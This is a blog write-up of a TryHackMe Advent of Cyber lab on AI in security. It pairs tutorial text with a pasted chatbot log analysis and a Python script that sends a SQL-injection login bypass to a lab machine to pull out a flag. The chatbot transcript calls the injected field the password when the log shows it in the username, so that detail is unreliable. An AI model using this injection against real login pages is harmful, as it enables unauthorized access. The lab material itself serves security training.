---
title: "AI in Security - old sAInt nick (TryHackMe) 🧑‍🎄🎉"
datePublished: Sat Dec 06 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmiwtw1vs000402jr0nd23m3s
slug: ai-in-security-old-saint-nick-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1765178711406/ba6e944e-3972-40aa-ae86-2719f7ef1e5f.png
tags: tryhackme, aisecurity, ai-code-assistant, adventofcyber2025, ai-log-analysis

---

Artificial intelligence has rapidly reshaped the way security teams work, and The Best Festival Company (TBFC) is no exception. As Christmas approaches, TBFC rolls out its new cybersecurity assistant, Van SolveIT, designed to support red, blue, and software teams in identifying vulnerabilities before attackers can exploit them.

Throughout this challenge, we take on the perspective of defenders, attackers, and developers using AI as an operational partner. From analysing logs to generating exploits to reviewing insecure code, today’s showcase highlights how AI can boost efficiency while also revealing the risks that come with increased automation. With these tools at our disposal, we explore how AI can improve security workflows—while keeping a critical eye on its limitations.

## Introduction

**The Story**

![task banner for day 4. Showing a wreath, with baubles hanging with various AI and cyber security related iconography](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1763383093538.png align="left")

The lights glimmer and servers hum blissfully at The Best Festival Company (TBFC), melting the snow surrounding the data centre. TBFC has continued its pursuit of AI excellence. After the past two years, they realise that Van Chatty, their in-house chatbot, wasn’t quite meeting their standards.

Unfortunately for the elves at TBFC, they are also not immune to performance metrics. The elves aim to find ways of increasing their velocity; something to manage the tedious, distracting tasks, which allows the elves to do the real magic.

TBFC, adventurous as ever, is trialling their brand new cyber security AI assistant, Van SolveIT, which is capable of helping the elves with all their defensive, offensive, and software needs. They decide to put this flashy technology to use as Christmas approaches, to identify, confirm, and resolve any potential vulnerabilities, before any nay-sayers can.

## **Learning Objectives**

* How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
    
* Using an AI assistant to solve various tasks within cyber security
    
* Some of the considerations, particularly in cyber security, surrounding the use of AI
    

## AI for Cyber Security Showcase

## **The Boom of AI Assistants**

Ah, yes, artificial intelligence, that buzzword that seems here to stay. Who would have thought? Today’s room will highlight some ways AI is utilised in cyber security, along with important considerations to bear in mind when deploying AI for such tasks.

Particularly at the time of writing, AI is increasingly seen as a tool to boost speed by handling often tedious, time-consuming tasks, allowing humans to perform the real magic. Organisations want to see experience, not avoidance, in how these tools are operated.

GPT this, GPT that, we’ve all heard it often. And it’s likely to persist. As AI’s capabilities expand daily, we’ve observed a shift from AI being just “something to ask because you were too lazy to Google” (a mistake I’ve made myself). Now, AI is being embedded into everyday workflows, transforming how tasks are done and boosting productivity like never before.

With that said, let’s begin today’s room!

![a christmas bauble ornament with an AI robot sitting inside of it.](https://tryhackme-images.s3.amazonaws.com/room-icons/5de96d9ca744773ea7ef8c00-1762182384720 align="left")

## **AI in Cyber Security**

The use of artificial intelligence has seen a significant boost in cyber security. Visit almost any vendor, and they'll now have some form of AI powering a solution somewhere. Why? Well, it's not just because they're capitalising on the buzzword (although that's certainly *a part of it*), but rather, the benefits from artificial intelligence really do apply here. Let's explore some of these in the table below:

| **Features of AI** | **Cyber Security Relevance** |
| --- | --- |
| Processing large amounts of data | Analysing vast data from multiple types of sources. For example, system and network logs together. |
| Behaviour analysis | Tracking normal behaviour and activities over a period of time and flagging anything that is out of the ordinary. |
| Generative AI | Summarising or providing context behind a series of events. |

## **Defensive Security**

![a piece of paper on a clipboard with a magnifying glass inspecting it.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1762271394697.png align="left")

AI agents are being used in blue teaming to speed up detection, investigation, and response, making them quicker and more dependable. Acting like automated assistants, these agents continuously process telemetry (logs, network flows, endpoint signals) and add context to alerts. Furthermore, we are witnessing the integration of AI into vendor appliances—such as AI-assisted firewalling and intrusion detection systems.

Beyond just detecting threats, AI can also assist in automating responses. Picture your system automatically isolating an infected device, blocking a suspicious email, or flagging an unusual login attempt — all in real time.

## **Offensive Security**

AI agents have made a notable impact on offensive security by automating and handling the often very labourious and time-consuming tasks that a pentester might traditionally undertake.

For example, AI can be a powerful tool in a penetration tester's workflow for reconnaissance and information gathering, from OSINT to analysing noisy scanner outputs and mapping attack surfaces. This allows the pentester to spend more time on the crucial tasks that require a human touch.

## **Software**

![three gears/cogs closely placed with one another.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1762271395568.svg align="left")

AI-driven software development, rightfully, sounds a bit frightening. Isn't that so? Well, you wouldn't be wrong to feel this way; we've all heard about the popularity of vibe coding and the vulnerabilities introduced by AI.

However, AI has proven to be a valuable addition to the software development process in several ways. One example is a virtual "colleague" to bounce ideas off while writing the code itself. More importantly, it is used as a SAST/DAST scanner. These scanners audit and analyse written code and applications for potential vulnerabilities.

Yes, it's somewhat ironic. AI agents can be great at identifying vulnerabilities, but are not quite as effective at writing secure code.

## **Considerations of AI In Cyber Security**

![a red closed book with the text "rules" on the cover.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1762271477832.svg align="left")

Now, I’m not entirely here to sing the praises of AI and say it’s the silver bullet to all your needs. If you’ve used AI before, you’ll know the pitfalls and frustrations one can face. And nowhere is that truer than in cyber security.

While the usual considerations of using AI apply, such as not owning the output from AI, there are specific factors to consider before deploying it in cyber security.

One such consideration is the use of AI in activities like offensive penetration testing. While we have discussed some of AI's applications in these areas, caution remains essential. You do not want to explain to a client that their services and websites are down because an AI has caused a race condition or overwhelmed their systems.

We must think carefully about the data AI learns from, how transparent and fair its decisions are, and how reliable it remains when the unexpected occurs. We cannot assume the output from AI is 100% correct. Efforts must be made to verify the information it provides. Additionally, managing challenges such as keeping data private, securing AI models, and informing users properly requires careful consideration.

## **Practical**

Phew! Ready for an exciting exercise? You will be interacting with Van SolveIT, who will guide you through three showcases of how AI can be used in cyber security:

* **Red:** Generate and use an exploit script.
    
* **Blue:** Analyse web logs of an attack that has occurred.
    
* **Software:** Analyse source code for vulnerabilities.
    

When you're ready, you can access Van SolveIT at `http://MACHINE_IP`. Remember, you will need to do so either from the AttackBox or your own device connected to the VPN.

*If you are on a small display, we recommend expanding the AttackBox into full screen mode which can be done by pressing the "two arrows" icon (left of the "+" icon) in the split-screen view to expand it into full screen.*

## **Usage Tips**

* Chatbot responses may appear blank for a minute or two while it generates the reply. You will start to see Van SolveIT's responses in real time.
    
* If the chatbot gets confused at any time, press the **Restart Chat** button at the top right of the page.
    
* As you progress throughout the showcase, stages will unlock. You can go back to any stage that you have unlocked by clicking on the stage name on the top left.  
      
    In this challenge, just follow the steps where needed, chat with the AI model by accepting or guiding it, remember its prompt engineering that influences the output though for this case the model seems to work universally.
    

### Answer the questions below

1. Complete the AI showcase by progressing through all of the stages. What is the flag presented to you?
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765174876528/01c366ad-1e02-4241-884b-b19abfca68b7.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765174907432/49fa19fa-78fc-4e96-bfd1-d822e48c7d0a.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765174938156/ad40c6c1-ad35-4e25-85e6-431921d05c8e.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765174956152/c84e864e-da87-43e8-aa9a-aa56cdd56e96.png align="center")
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765175065031/2fa4ab92-2966-49e3-bf21-2b7fb673fc0d.png align="center")
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765175154044/5e9d6bad-4d1e-4784-8c03-30044fbfdbc5.jpeg align="center")
    
    1. Execute the exploit provided by the red team agent against the vulnerable web application hosted at `MACHINE_IP:5000`. What flag is provided in the script's output after it?
        
          
        Remember, you will need to update the IP address placeholder in the script with the IP of your vulnerable machine (`MACHINE_IP:5000`)  
          
        To obtain the flag, we need a Python script, so I shared the red team output with ChatGPT, and it helped generate the script. I created a Python file `nano script.py` and running the `python3 script.py` command  
        
        ```markdown
        AI Assistant Welcome to the Red Team showcase! I can help you generate Python scripts for the vulnerabilities within the web application of today's Advent of Cyber web application. Shall we begin? You yes we can Van SolveIT AI is thinking... AI Assistant LOG ENTRIES: 198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test" --- ### Analysis of the Logs 1. Log Entry Details: - IP Address: 198.51.100.22 - Time: 3 October 2025 at 09:03 - URL: /login.php - Username Attempted: alice%27+OR+1%3D1+--+- - SQL Injection Evidence: The password parameter contains a malicious SQL statement: OR 1=1 -- -, which is a common SQL injection technique. 2. Why It\u2019s Important: - Vulnerability Detection: This log entry indicates a potential SQL injection attack, which compromises user data by allowing unauthorized access. - Blue Team Insights: - Detecting such attacks helps identify and mitigate vulnerabilities in the application. - It highlights the need for regular security audits and updates to prevent similar attacks. --- Final Confirmation: Yes! The log entry demonstrates a clear vulnerability. As a Blue Team Assistant, analyzing such logs is essential to proactively address security risks and improve system resilience. If you're ready to move on, please click the "Complete Stage to Continue" button.
        ```
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765176333426/0bd44292-1cc3-413b-a1bc-19a59178bc14.png align="center")
        
        ```python
        import requests
        
        # Target machine
        URL = "http://10.49.173.168:5000/login.php"   # <-- change to your machine if needed
        
        # Malicious SQL injection payload
        payload = {
            "username": "alice' OR 1=1 -- -",
            "password": "test"
        }
        
        print("[+] Sending injection payload...")
        response = requests.post(URL, data=payload)
        
        # Print useful info
        print("[+] Status Code:", response.status_code)
        
        if "THM{" in response.text:
            print("[+] FLAG FOUND!")
            # Extract flag
            import re
            flag = re.search(r"(THM\{.*?\})", response.text)
            if flag:
                print(flag.group(1))
            else:
                print(response.text)
        else:
            print("[*] Response did not contain the flag. Printing response:")
            print(response.text)
        ```
        
          
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1765177588388/136157b1-bb4d-4b68-8e25-ac9d9d86506b.jpeg align="center")
        
          
        
2. If you enjoyed today's room, feel free to check out the [Defending Adverserial Attacks](https://tryhackme.com/room/defadversarialattacks) room, where you will learn how to harden and secure AI models.
    

In 2025, the adoption of AI has accelerated to the point where many organisations rely heavily on automated tools for coding, analysis, and decision-making. While this boosts efficiency, it also introduces new security concerns that cannot be ignored. This challenge demonstrated how AI can support red team, blue team, and software development tasks — but also reminded us that AI itself is not inherently secure.

Attacks such as prompt injection, data poisoning, and model manipulation highlight the importance of auditing AI systems just as rigorously as traditional infrastructure. Trust must be earned and verified, not assumed. As we saw in this exercise, AI can assist in generating exploits, analysing logs, and reviewing code, but human oversight remains essential to ensure accuracy, prevent abuse, and avoid relying blindly on model outputs.

Ultimately, AI is a powerful augmentation to cybersecurity teams, not a replacement. The key is understanding when to leverage its strengths — and when to apply human judgment.